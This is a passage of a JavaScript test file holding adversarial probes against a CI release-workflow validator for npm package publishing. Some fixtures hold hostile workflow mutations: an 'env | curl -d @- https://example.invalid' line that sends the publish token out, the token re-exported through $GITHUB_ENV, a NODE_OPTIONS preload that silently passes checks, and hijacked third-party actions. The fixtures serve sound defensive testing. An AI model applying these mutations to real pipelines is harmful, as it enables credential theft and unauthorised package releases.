  // Four lenses independently defeated the reshape's own guarantees. Each entry below is one of
  // those defeats, turned into a re-runnable probe — the evidence dies with the review otherwise.
  {
    // Alphonso Experiment A / Renata M21, in their final form. Every prose-based defeat of the old
    // regex rules — a full-line comment mentioning `--tag`, a TRAILING one, `--tag latest`
    // hard-coded, `TAG=latest` reassigned after the input-derived line — worked by making the
    // workflow TEXT look right while the publish did something else. None of them is expressible
    // any more, because the payload no longer decides the tag: it invokes a script that refuses.
    // What remains catchable here is bypassing the script, and that is what these two probe.
    what: 'the payload publishing inline instead of through the refusing script',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(
          /run: node scripts\/publish-derived-set\.mjs/,
          'run: |\n          # publishes via scripts/publish-derived-set.mjs\n          npm publish --tag "$TAG"',
        ),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // A SECOND publish riding alongside the script call — the script is only a guarantee if it is
    // the sole route to the registry.
    what: 'a stray `npm publish` beside a correct call to the publish script',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(
          /run: node scripts\/publish-derived-set\.mjs/,
          'run: |\n          node scripts/publish-derived-set.mjs\n          npm publish --tag latest',
        ),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // REL4 (#396): the OpenDesign package check is an every-stream step, so deleting it is refused.
    what: 'the payload with the OpenDesign package check deleted',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {6}- name: OpenDesign\n {8}run: node scripts\/build-opendesign-package\.mjs --check\n/, ''),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // REL4: after the bump it compares against mutated manifests — the size-check blocker, again.
    what: 'the OpenDesign package check moved AFTER the prerelease bump',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {6}- name: OpenDesign\n {8}run: node scripts\/build-opendesign-package\.mjs --check\n/, '').replace(
          '      - name: Bump\n        run: node scripts/bump-prerelease.mjs --from-registry\n',
          '      - name: Bump\n        run: node scripts/bump-prerelease.mjs --from-registry\n      - name: OpenDesign\n        run: node scripts/build-opendesign-package.mjs --check\n',
        ),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  ...[
    ['the OpenDesign check neutralised with `|| true`', 'OpenDesign', 'node scripts/build-opendesign-package.mjs --check || true'],
    ['the OpenDesign check replaced by an echo of itself', 'OpenDesign', 'echo node scripts/build-opendesign-package.mjs --check'],
    ['the size check neutralised with `|| true` (the REL2 hole REL4 review found)', 'Sizes', 'node scripts/measure-elements-sizes.mjs --check || true'],
  ].map(([what, name, run]) => ({
    what,
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(
          new RegExp(` {6}- name: ${name}\\n {8}run: [^\\n]*\\n`),
          `      - name: ${name}\n        run: ${run}\n`,
        ),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  })),
  {
    what: 'the OpenDesign check run under `shell: sh -c true {0}` (executes nothing)',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {6}- name: OpenDesign\n/, '      - name: OpenDesign\n        shell: sh -c true {0}\n'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    what: 'the OpenDesign package regenerated in write mode just before its check',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {6}- name: OpenDesign\n/, '      - name: Refresh\n        run: node scripts/build-opendesign-package.mjs\n      - name: OpenDesign\n'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    what: 'the OpenDesign check given a NODE_OPTIONS preload that exits 0',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {6}- name: OpenDesign\n/, '      - name: OpenDesign\n        env:\n          NODE_OPTIONS: --import=data:text/javascript,process.exit(0)\n'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    what: 'a NODE_OPTIONS preload written to $GITHUB_ENV before the OpenDesign check',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {6}- name: OpenDesign\n/, '      - name: Env\n        run: echo "NODE_OPTIONS=--import=data:text/javascript,process.exit(0)" >> "$GITHUB_ENV"\n      - name: OpenDesign\n'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  ...[
    ['the size record rewritten in write mode just before its check', / {6}- name: Sizes\n/, '      - name: Refresh\n        run: node scripts/measure-elements-sizes.mjs\n      - name: Sizes\n'],
    ['a NODE_OPTIONS preload at job level', /(\n {4}steps:\n)/, '\n    env:\n      NODE_OPTIONS: --import=data:text/javascript,process.exit(0)$1'],
    ['a NODE_OPTIONS preload under a lower-case step key', / {6}- name: OpenDesign\n/, '      - name: OpenDesign\n        env:\n          node_options: --import=data:text/javascript,process.exit(0)\n'],
  ].map(([what, anchor, text]) => ({
    what,
    run: () =>
      checkWorkflowUsesDerivedSet(withPayloadDefect(anchor, text), ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml'),
  })),
  {
    what: 'a NODE_OPTIONS preload at workflow level',
    run: () =>
      checkWorkflowUsesDerivedSet(
        `env:\n  NODE_OPTIONS: --import=data:text/javascript,process.exit(0)\n${REUSABLE_PAYLOAD_FIXTURE}`,
        ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml',
      ),
  },
  {
    what: 'a no-op default shell for the whole workflow',
    run: () =>
      checkWorkflowUsesDerivedSet(
        `defaults:\n  run:\n    shell: sh -c true {0}\n${REUSABLE_PAYLOAD_FIXTURE}`,
        ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml',
      ),
  },
  {
    what: 'the publish job given a no-op default shell',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/(\n {4}steps:\n)/, '\n    defaults:\n      run:\n        shell: sh -c true {0}$1'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  // ── REL3 (#364): every publish is of attested bytes ──────────────────────────────────────
  ...(() => {
    const ATTEST = `      - name: Attest\n        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\n        with:\n          subject-path: 'dist-tarballs/*.tgz'\n`;
    const PACK = '      - name: Pack\n        run: node scripts/pack-derived-set.mjs\n';
    const VERIFY = '      - name: Verify\n        env:\n          GH_TOKEN: ${{ github.token }}\n          SIGNER_WORKFLOW: spec-kitty/spec-kitty-design/.github/workflows/publish-packages.yml\n          SOURCE_DIGEST: ${{ github.sha }}\n        run: node scripts/verify-published-integrity.mjs\n';
    const PUB = '      - name: Publish\n        env:\n          DIST_TAG: ${{ inputs.dist-tag }}\n        run: node scripts/publish-derived-set.mjs\n';
    const BUMP = '      - name: Bump\n        run: node scripts/bump-prerelease.mjs --from-registry\n';
    const payload = (what, anchor, text) => ({
      what: `REL3 payload: ${what}`,
      run: () => checkWorkflowUsesDerivedSet(withPayloadDefect(anchor, text), ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml'),
    });
    const release = (what, anchor, text) => ({
      what: `REL3 release: ${what}`,
      run: () => checkWorkflowUsesDerivedSet(withDefect(anchor, text), ['@spec-kitty/tokens'], ['tokens']),
    });
    return [
      payload('the attest step deleted', ATTEST, ''),
      payload('the attest step moved after the publish', ATTEST + PUB, PUB + ATTEST),
      payload('the attest step made conditional', '      - name: Attest\n', '      - name: Attest\n        if: false\n'),
      payload('the attest subject pointed at something other than dist-tarballs/', "subject-path: 'dist-tarballs/*.tgz'", "subject-path: 'packages/*/package.json'"),
      payload('the attest action pinned to a mutable tag', 'actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8', 'actions/attest-build-provenance@v4'),
      payload('an attest action from another owner, even SHA-pinned', 'actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8', 'evil/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8'),
      payload('a second subject source alongside the tarballs', "          subject-path: 'dist-tarballs/*.tgz'\n", "          subject-path: 'dist-tarballs/*.tgz'\n          subject-digest: sha256:0000\n"),
      payload('the pack step deleted', PACK, ''),
      payload('the pack step moved before the prerelease bump', BUMP + PACK, PACK + BUMP),
      payload('the pack step moved after the attest step', PACK + ATTEST, ATTEST + PACK),
      // Order probes the adjacency rule cannot mask: attest stays directly before publish.
      payload('the integrity check moved before the pack step', PACK + ATTEST + PUB + VERIFY, VERIFY + PACK + ATTEST + PUB),
      payload('the pack step moved after the publish', PACK + ATTEST + PUB, ATTEST + PUB + PACK),
      payload('the integrity check deleted', VERIFY, ''),
      payload('the integrity check moved before the publish', PUB + VERIFY, VERIFY + PUB),
      payload('the payload job without `id-token: write`', '      id-token: write\n', ''),
      release('the attest step deleted', ATTEST, ''),
      release('the workflow without `attestations: write`', '  attestations: write\n', ''),
      payload('a step between the attest and the publish (could repack dist-tarballs/)', PUB, '      - name: Repack\n        run: rm -rf dist-tarballs && node scripts/pack-derived-set.mjs\n' + PUB),
      release('a step between the attest and the publish', '      - name: Publish\n        run: node scripts/publish-latest.mjs', '      - name: Tidy\n        run: echo tidy\n      - name: Publish\n        run: node scripts/publish-latest.mjs'),
      release('an inline `npm publish` alongside the script (a second, unattested path)', '        run: node scripts/publish-latest.mjs\n', '        run: node scripts/publish-latest.mjs\n      - name: Extra\n        run: npm publish packages/tokens --tag latest\n'),
      release('the prod publish script neutralised with `|| true`', 'run: node scripts/publish-latest.mjs\n', 'run: node scripts/publish-latest.mjs || true\n'),
      release('the prod publish replaced by an inline loop over the tarballs', '        run: node scripts/publish-latest.mjs\n', '        run: for f in dist-tarballs/*.tgz; do npm publish "$f" --tag latest; done\n'),
      payload('NODE_AUTH_TOKEN back at job level', '    steps:\n      - uses: actions/checkout@', '    env:\n      NODE_AUTH_TOKEN: x\n    steps:\n      - uses: actions/checkout@'),
      release('NODE_AUTH_TOKEN handed to the SBOM step', '      - name: SBOM\n', '      - name: SBOM\n        env:\n          NODE_AUTH_TOKEN: x\n'),
      payload('checkout persisting its credentials', '{ fetch-depth: 0, persist-credentials: false }', '{ fetch-depth: 0 }'),
      release('checkout persisting its credentials', '{ fetch-depth: 0, persist-credentials: false }', '{ fetch-depth: 0, persist-credentials: true }'),
      payload('an npx that may fetch at release time', 'npx --no-install nx run-many', 'npx nx run-many'),
      release('the SBOM tool fetched instead of run from the lockfile', 'npx --no-install @cyclonedx/cyclonedx-npm', 'npx @cyclonedx/cyclonedx-npm@latest'),
      payload('the verify step pinned to the wrong signer workflow', 'SIGNER_WORKFLOW: spec-kitty/spec-kitty-design/.github/workflows/publish-packages.yml', 'SIGNER_WORKFLOW: spec-kitty/spec-kitty-design/.github/workflows/ci-quality.yml'),
      payload('the verify step without a source-digest pin', '          SOURCE_DIGEST: ${{ github.sha }}\n        run: node scripts/verify-published-integrity.mjs', '        run: node scripts/verify-published-integrity.mjs'),
      payload('a `subject-checksums` source alongside the tarballs', "          subject-path: 'dist-tarballs/*.tgz'\n", "          subject-path: 'dist-tarballs/*.tgz'\n          subject-checksums: sums.txt\n"),
      payload('a `subject-name` override', "          subject-path: 'dist-tarballs/*.tgz'\n", "          subject-path: 'dist-tarballs/*.tgz'\n          subject-name: other\n"),
      payload('`permissions: write-all` instead of the explicit scopes', '    permissions:\n      contents: read\n      packages: write\n      id-token: write\n      attestations: write\n', '    permissions: write-all\n'),
      payload('the rc payload running the prod publish script', PUB, PUB + '      - name: Prod\n        run: node scripts/publish-latest.mjs\n'),
      payload('an `npx` inside a command substitution, unpinned', 'npx --no-install nx run-many', 'echo "$(npx some-tool@latest)" && npx --no-install nx run-many'),
      payload('`npm exec` fetching a package at release time', 'npx --no-install nx run-many', 'npm exec --yes -- some-tool@latest && npx --no-install nx run-many'),
      payload('the token re-exported through $GITHUB_ENV', 'npx --no-install nx run-many', 'echo "NODE_AUTH_TOKEN=$NODE_AUTH_TOKEN" >> "$GITHUB_ENV" && npx --no-install nx run-many'),
      // REL3 pass 3: rules that existed with no probe, and the token-holder rule tightened from a substring test.
      release('the token on a step that merely NAMES a registry script', '      - name: Pack\n', '      - name: Sneak\n        env:\n          NODE_AUTH_TOKEN: x\n        run: echo node scripts/publish-latest.mjs && env | curl -d @- https://example.invalid\n      - name: Pack\n'),
      release('the token on a registry script run with extra words', '      - name: Pack\n', '      - name: Sneak\n        env:\n          NODE_AUTH_TOKEN: x\n        run: node scripts/verify-published-integrity.mjs; env | curl -d @- https://example.invalid\n      - name: Pack\n'),
      release('a shell step holding the token, even one that really runs the dist-tag report', '      - name: Report\n', '      - name: Shell report\n        env:\n          NODE_AUTH_TOKEN: x\n        run: npm dist-tag ls "@spec-kitty/tokens" && env | curl -d @- https://example.invalid\n      - name: Report\n'),
      release('the dist-tag report chained behind another command', '        run: node scripts/report-dist-tags.mjs', '        run: node scripts/report-dist-tags.mjs || true'),
      release('the dist-tag report echoed instead of run', '        run: node scripts/report-dist-tags.mjs', '        run: echo node scripts/report-dist-tags.mjs'),
      release('the dist-tag report behind an `if:`', '      - name: Report\n', '      - name: Report\n        if: always()\n'),
      release('no checkout step at all (nothing to hold to persist-credentials: false)', '      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\n        with: { fetch-depth: 0, persist-credentials: false }\n', ''),
      release('NODE_AUTH_TOKEN at workflow level', 'permissions:\n  contents: write\n', 'env:\n  NODE_AUTH_TOKEN: x\npermissions:\n  contents: write\n'),
      release('the verify step without GH_TOKEN', '          GH_TOKEN: ${{ github.token }}\n', ''),
      release('the release job forging GITHUB_WORKFLOW_REF, which its own guard reads', '      - name: Pack\n', '      - name: Pack\n        env:\n          GITHUB_WORKFLOW_REF: spec-kitty/spec-kitty-design/.github/workflows/release.yml@refs/tags/v9.9.9\n'),
      release('the release job forging GITHUB_REF_TYPE', '      - name: Pack\n', '      - name: Pack\n        env:\n          GITHUB_REF_TYPE: tag\n'),
      payload('`npm x`, npm\'s own alias for `npm exec`, fetching at release time', 'npx --no-install nx run-many', 'npm x --yes -- some-tool@latest && npx --no-install nx run-many'),
      payload('an unpinned npx hidden behind a pipe into a pinned one', 'npx --no-install nx run-many', 'npx some-tool@latest | npx --no-install cat'),
      release('a local composite action in the release job', '      - name: Pack\n', '      - name: Local\n        uses: ./.github/actions/helper\n      - name: Pack\n'),
      payload('a local composite action in the payload job', '      - name: Pack\n', '      - name: Local\n        uses: ./.github/actions/helper\n      - name: Pack\n'),
      {
        what: 'REL3 caller: a branch-triggered workflow running publish-latest.mjs (claims latest)',
        // WITH A DELEGATING CALLER IN THE FIXTURE (REL3 pass 4, reducer and reviewer both): a
        // single-file fixture also trips "no workflow delegates to the reusable publish workflow",
        // so this probe tripped with the confinement rule deleted — it proved nothing.
        run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/pack-derived-set.mjs\n      - run: node scripts/publish-latest.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]),
      },
      {
        what: 'REL3 caller: the rc payload file running publish-latest.mjs',
        run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/publish-packages.yml', text: 'on:\n  workflow_call: {}\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/publish-latest.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }], REUSABLE_PAYLOAD_FIXTURE),
      },
      {
        what: 'REL3: prod (publishing via publish-latest.mjs) pointing setup-node at another registry',
        run: () => {
          const pkgs = [{ name: '@spec-kitty/tokens', publishConfig: { registry: 'https://npm.pkg.github.com' } }];
          const wf = VALID_RELEASE_WORKFLOW.replace('jobs:\n  release:\n    steps:\n', "jobs:\n  release:\n    steps:\n      - uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e\n        with:\n          registry-url: 'https://registry.npmjs.org'\n");
          if (wf === VALID_RELEASE_WORKFLOW) throw new Error('anchor not found');
          // The rc caller rides along with a CORRECT registry, so the set is never empty and only the
          // prod workflow's npmjs registry-url can trip this probe.
          return checkRegistryAuthorityAgrees(pkgs, [{ file: '.github/workflows/release.yml', text: wf }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]);
        },
      },
      payload('a custom predicate on the attest step', "          subject-path: 'dist-tarballs/*.tgz'\n", "          subject-path: 'dist-tarballs/*.tgz'\n          predicate-type: https://example.com/custom\n"),
      {
        what: 'REL3 caller: the rc caller without `attestations: write` (the payload needs it; the caller is its ceiling)',
        run: () => checkPublishingCallersDelegate([{ file: 'release-rc.yml', text: withCallerDefect('      attestations: write\n', '') }], REUSABLE_PAYLOAD_FIXTURE),
      },
    ];
  })(),
  {
    what: 'the OpenDesign check made conditional with `if: false`',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {6}- name: OpenDesign\n/, '      - name: OpenDesign\n        if: false\n'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Debbie pass 4, the BLOCKER's `env:` variant: a step that sets the very signal the publish
    // guard reads is forging the evidence it weighs.
    what: 'the payload setting GITHUB_REF_TYPE in a step `env:` block',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {10}DIST_TAG: [^\n]*\n/, '          DIST_TAG: ${{ inputs.dist-tag }}\n          GITHUB_REF_TYPE: tag\n'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Debbie pass 4: flattening to LINE positions closed the same-step hole and left a same-LINE
    // one — `bump && size-check` tied, so the ordering comparison was false whatever the order.
    what: 'the bump and the size check consolidated onto ONE line, bump first',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(
          / {6}- name: Sizes\n {8}run: node scripts\/measure-elements-sizes\.mjs --check\n/,
          '      - name: consolidated\n        run: node scripts/bump-prerelease.mjs --from-registry && node scripts/measure-elements-sizes.mjs --check\n',
        ).replace('      - name: Bump\n        run: node scripts/bump-prerelease.mjs --from-registry\n', ''),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Randy pass 4: `npm --tag latest publish` — npm's ordinary flag-before-subcommand form — did
    // not match /npm\s+publish\b/, and a TRAILING comment satisfied the "invokes the script" rule.
    // Both survivors of the three rules they replaced, inheriting the same defeat class.
    what: 'an inline publish written as `npm --tag latest publish`, excused by a trailing comment',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(
          / {8}run: node scripts\/publish-derived-set\.mjs/,
          '        run: |\n          echo pub   # via node scripts/publish-derived-set.mjs\n' +
            '          for pkg in $DIRS; do ( cd "packages/$pkg" && npm --tag latest publish ); done',
        ),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Randy pass 4 / Alphonso A4-2: `--dry-run` appended turns the release into a no-op that every
    // gate reported green. The delta deleted the "must actually publish" rule without replacing it.
    what: 'the publish script invoked with --dry-run (a green release that publishes nothing)',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(
          / {8}run: node scripts\/publish-derived-set\.mjs/,
          '        run: node scripts/publish-derived-set.mjs --dry-run',
        ),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Renata pass 4: `npm dist-tag add` is the OTHER documented route to a dist-tag, and the script
    // never sees it. A plausible "Promote to latest" step claimed the prod channel, all gates green.
    what: 'a `Promote to latest` step using `npm dist-tag add` beside a correct script call',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(
          / {8}run: node scripts\/publish-derived-set\.mjs/,
          '        run: |\n          node scripts/publish-derived-set.mjs\n' +
            '          npm dist-tag add "@spec-kitty/tokens@1.0.0" latest',
        ),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Renata pass 4: `/DIST_TAG/` over the whole file was satisfied by a COMMENT while the env
    // hand-off was deleted — a token test standing in for a data-flow assertion, the fourth
    // occurrence of that class in this file. Now read from the parsed step.
    what: 'the DIST_TAG hand-off deleted, with only a comment left mentioning it',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(
          / {8}env:\n {10}DIST_TAG: [^\n]*\n/,
          '        # DIST_TAG is supplied by the caller\n',
        ),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    what: 'the DIST_TAG hand-off hard-coded instead of forwarding inputs.dist-tag',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/DIST_TAG: \$\{\{ inputs\.dist-tag \}\}/, 'DIST_TAG: latest'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Debbie/Randy: the DIST_TAG hand-off had no probe, and the script refuses without it — so
    // dropping the env block turns every publish into a hard refusal at run time.
    what: 'the payload dropping the DIST_TAG env hand-off to the publish script',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/ {8}env:\n {10}DIST_TAG: [^\n]*\n/, ''),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Renata, M15. Deleting the bump silently reverts the fix for "it can publish exactly once".
    what: 'the payload with the prerelease bump deleted (the stream could publish exactly once)',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect('      - name: Bump\n        run: node scripts/bump-prerelease.mjs --from-registry\n', ''),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Renata, M16. Keeping the bump but dropping the flag recomputes the same version every run.
    what: 'the bump running without --from-registry (publish #2 dies on EPUBLISHCONFLICT)',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(/bump-prerelease\.mjs --from-registry/, 'bump-prerelease.mjs'),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Debbie's BLOCKER, as a probe. The bump mutates the manifests the size record measures, so a
    // byte-exact `--check` downstream of it compares against a tree that can never match.
    what: 'the bump ordered BEFORE the size check (unremediable size drift on the first rc run)',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect(
          '      - name: Bump\n        run: node scripts/bump-prerelease.mjs --from-registry\n',
          '',
        ).replace(
          '      - name: Sizes\n',
          '      - name: Bump\n        run: node scripts/bump-prerelease.mjs --from-registry\n      - name: Sizes\n',
        ),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Renata, M17. `[ENFORCED]` in this repo means "registered in a wiring checker"; on this step
    // it was decoration.
    what: 'the ADR-005 security gate deleted from the payload despite its [ENFORCED] label',
    run: () =>
      checkWorkflowUsesDerivedSet(
        withPayloadDefect('      - name: Security\n        run: bash scripts/npm-audit-gate.sh\n', ''),
        ['@spec-kitty/tokens'],
        ['tokens'],
        'publish',
        'publish-packages.yml',
      ),
  },
  {
    // Renata M3 / Alphonso Experiment C. The mission's entire deliverable, deletable with every
    // gate green — the function refused zero FILES and accepted zero DELEGATING JOBS.
    what: 'no workflow delegating to the payload at all (the rc stream deleted outright)',
    run: () => checkPublishingCallersDelegate([{ file: 'ci-quality.yml', text: 'jobs:\n  lint:\n    runs-on: ubuntu-latest\n' }]),
  },
  {
    // Alphonso, Experiment C proper: the caller re-inlines a tagless publish and delegates to
    // nothing — byte-for-byte the state the reshape exists to prevent, one revert away.
    what: 'a caller that re-inlines its own publish instead of delegating',
    run: () =>
      checkPublishingCallersDelegate([
        {
          file: 'release-rc.yml',
          text:
            'jobs:\n  rc:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n' +
            '          for pkg in $(node scripts/release-graph.mjs --dirs); do ( cd "packages/$pkg" && npm publish ); done\n',
        },
      ]),
  },
  {
    // Renata, M4. Non-empty was never the contract — `latest` from a branch-triggered caller
    // claims the prod channel exactly as omitting the tag would.
    what: 'a branch-triggered caller passing `dist-tag: latest`',
    run: () => checkPublishingCallersDelegate([{ file: 'release-rc.yml', text: withCallerDefect('dist-tag: rc', 'dist-tag: latest') }]),
  },
  {
    // Renata, M7. The standing operator ruling is GitHub Packages only; non-emptiness let the
    // stream be repointed at npmjs.org with every gate green.
    what: 'a caller repointing the stream at npmjs.org',
    run: () =>
      checkPublishingCallersDelegate([
        { file: 'release-rc.yml', text: withCallerDefect(GH_PACKAGES, 'https://registry.npmjs.org') },
      ]),
  },
  {
    // THE PASS-3 BLOCKER, from the other side. All four lenses restored `contents: write` in the
    // payload and watched the whole gate stay green, because the ceiling was a hand-copied constant
    // and nothing opened the payload. This probe is the payload-side direction.
    what: 'the payload declaring a permission above its recorded minimum (the pass-2 blocker, restored)',
    run: () =>
      checkPublishingCallersDelegate(
        [{ file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }],
        'jobs:\n  publish:\n    permissions:\n      contents: write\n      packages: write\n',
      ),
  },
  {
    what: 'the payload declaring a blanket `permissions: write-all`',
    run: () =>
      checkPublishingCallersDelegate(
        [{ file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }],
        'jobs:\n  publish:\n    permissions: write-all\n',
      ),
  },
  {
    what: 'the payload declaring no `permissions:` block at all',
    run: () =>
      checkPublishingCallersDelegate(
        [{ file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }],
        'jobs:\n  publish:\n    runs-on: ubuntu-latest\n',
      ),
  },
  {
    // Alphonso: `'nightly-release.yml'.endsWith('release.yml')` is true, so any workflow named
    // that way could publish inline while exempt.
    what: 'an inline publisher hiding behind a name that merely ENDS WITH release.yml',
    run: () =>
      checkPublishingCallersDelegate([
        { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE },
        {
          file: '.github/workflows/nightly-release.yml',
          text: 'jobs:\n  ship:\n    steps:\n      - run: npm publish\n',
        },
      ]),
  },
  {
    // Alphonso: a comment containing `tags:` was enough to license `dist-tag: latest`.
    what: 'a branch-triggered caller passing `dist-tag: latest` with a comment mentioning tags:',
    run: () =>
      checkPublishingCallersDelegate([
        {
          file: '.github/workflows/release-rc.yml',
          text: '# note: prod uses tags: for its trigger\n' + VALID_CALLER_FIXTURE.replace('dist-tag: rc', 'dist-tag: latest'),
        },
      ]),
  },
  {
    // Alphonso: `uses.includes('publish-packages.yml')` accepted a third-party payload.
    what: 'a caller delegating to a THIRD-PARTY workflow whose path merely contains the filename',
    run: () =>
      checkPublishingCallersDelegate([
        {
          file: '.github/workflows/release-rc.yml',
          text: VALID_CALLER_FIXTURE.replace('./.github/workflows/publish-packages.yml', 'evil-org/evil/.github/workflows/publish-packages.yml@main'),
        },
      ]),
  },
  {
    // Alphonso's BLOCKER, as a probe. The caller's grant is a CEILING: a payload declaring above it
    // fails validation and the run never starts. Nothing read `permissions:` at all.
    what: "a caller granting less than the payload declares (the run would never start)",
    run: () =>
      checkPublishingCallersDelegate([
        { file: 'release-rc.yml', text: withCallerDefect('      packages: write\n', '      packages: read\n') },
      ]),
  },
  {
    what: 'a caller with no `permissions:` block at all',
    run: () =>
      checkPublishingCallersDelegate([
        {
          file: 'release-rc.yml',
          text: withCallerDefect('    permissions:\n      contents: read\n      packages: write\n', ''),
        },
      ]),
  },
  {
    // Alphonso's measured finding: publishConfig outranks setup-node's registry-url, so a manifest
    // can silently redirect the publish while the workflow input still reads correct.
    what: 'a manifest whose publishConfig.registry disagrees with the caller\'s declared registry',
    run: () =>
      checkRegistryAuthorityAgrees(
        [{ name: '@spec-kitty/tokens', dir: 'tokens', private: false, publishConfig: { registry: 'https://registry.npmjs.org' } }],
        [{ file: 'release-rc.yml', text: VALID_CALLER_FIXTURE }],
      ),
  },
  {
    // Pass 6, B1. npm resolves `manifest.tag || defaultTag`, so this key beats `--tag` and the run
    // log still prints the flag's value. Reproduced against a local registry before the guard.
    what: 'a manifest declaring a top-level `tag` that would override the workflow\'s dist-tag',
    run: () =>
      checkRegistryAuthorityAgrees(
        [{ name: '@spec-kitty/tokens', dir: 'tokens', private: false, tag: 'latest', publishConfig: { registry: GH_PACKAGES } }],
        [{ file: 'release-rc.yml', text: VALID_CALLER_FIXTURE }],
      ),
  },
  {
    what: 'a publishable manifest with no publishConfig.registry at all (destination left to the runner)',
    run: () =>
      checkRegistryAuthorityAgrees(
        [{ name: '@spec-kitty/tokens', dir: 'tokens', private: false }],
        [{ file: 'release-rc.yml', text: VALID_CALLER_FIXTURE }],
      ),
  },
  {
    what: 'the registry-authority check asserted over zero packages',
    run: () => checkRegistryAuthorityAgrees([], [{ file: 'release-rc.yml', text: VALID_CALLER_FIXTURE }]),
  },
  {
    what: 'a caller delegating to the publish workflow with NO dist-tag (npm would write `latest`)',
    run: () =>
      checkPublishingCallersDelegate([
        {
          file: 'caller.yml',
          text: 'jobs:\n  rc:\n    uses: ./.github/workflows/publish-packages.yml\n    with:\n      registry: https://npm.pkg.github.com\n',
        },
      ]),
  },
  {
    what: 'a caller delegating with an EMPTY dist-tag',
    run: () =>
      checkPublishingCallersDelegate([
        {
          file: 'caller.yml',
